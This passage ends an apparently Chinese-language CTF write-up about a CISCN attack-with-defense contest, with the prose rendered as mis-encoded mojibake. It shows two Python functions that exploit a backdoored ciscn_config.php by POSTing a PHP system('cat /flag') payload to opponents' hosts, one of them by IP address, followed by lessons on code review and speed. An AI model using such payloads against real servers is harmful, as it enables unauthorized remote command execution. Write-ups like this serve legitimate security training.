<p>æ­¤åæ“ä½œä¸ç¬¬ä¸€ç¬¬äºŒç›¸åŒï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_config1(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;XXX:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_config.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;pass&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    #key&#x3D;&#39;&#39;</span><br><span class="line">    #print(req.text)</span><br><span class="line">    key&#x3D;(req.text).split(&#39;: &#39;)[-1]</span><br><span class="line">    flag.append(key)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒä¸ªæ´ä¸ºPOSTä¼ å‚ä¸€ä¸ªåä¸ºxçš„å‚æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def ciscn_config2(i):</span><br><span class="line">    attack_url&#x3D;&#39;http:&#x2F;&#x2F;118.89.227.105:&#39;+ str(i) +&#39;&#x2F;blog&#x2F;ciscn_config.php&#39;</span><br><span class="line">    data&#x3D;&#123;&quot;x&quot;:&quot;system(&#39;cat &#x2F;flag&#39;);&quot;&#125;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;attack_url,data&#x3D;data)</span><br><span class="line">    #key&#x3D;&#39;&#39;</span><br><span class="line">    #print(req.text)</span><br><span class="line">    key&#x3D;(req.text).split(&#39;: &#39;)[-1]</span><br><span class="line">    flag.append(key)</span><br><span class="line">    print(flag)</span><br><span class="line">    #exception(req)</span><br></pre></td></tr></table></figure>

<hr>
<p>è‡³æ­¤ï¼Œä»¥ä¸Šä¸ºæœ¬äººæ­¤æ¬¡æ¯”èµ›æ‰¾åˆ°çš„æ‰€æœ‰æ´ï¼Œæ”¶è·é¢‡å¤š.</p>
<blockquote>
<p>1.éšè—åœ¨æ­£å¸¸æœåŠ¡ä¸­çš„æ´å¾€å¾€ä¸å®¹æ˜“è¢«å‘ç°ï¼ˆåºŸè¯ï¼‰,ç®€å•åˆ é™¤åä¼šå› æ­¤å¤±åˆ†ï¼Œå› æ­¤å®¡ä»£ç æ˜¯ç›¸å½“é‡è¦çš„èƒ½åŠ›ã€‚</p>
</blockquote>
<blockquote>
<p>2.æé«˜é€Ÿåº¦ï¼ŒAWDå¾€å¾€æ˜¯æ¯”æ‰‹é€Ÿï¼Œå°½ç®¡åœ¨æ¯”èµ›å½“æ—¶ç¬”è€…æ‹¿flagçš„æ–¹å¼ç›¸å½“å¼±æ™ºï¼Œä½†äº‹åé€šè¿‡å¯¹æ‰¹é‡åŒ–çš„å­¦ä¹ ä»¥åŠåº”ç”¨åŠ æ·±äº†å¯¹æ­¤çš„ä½“ä¼šã€‚</p>
</blockquote>
<blockquote>
<p>3.ç»§ç»­åŠªåŠ›ã€‚</p>
</blockquote>
</div></header><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a class="post__tag__link" href="/tags/AWD/">AWD</a></li></ul></footer></article><section class="reward"><a class="btn-reward" href="#">æ‰“èµ</a><div class="reward-wrapper clearfix"><img src="/img/wechat.jpg" title="å¾®ä¿¡"></div></section></main><footer class="foot"><div class="foot-copy">&copy; 2016 - 2021 ç…¤çŸ¿è·¯å£è¥¿</div></footer>
<script src="/js/scroller.js"></script>

<script src="/js/main.js"></script>
</body></html>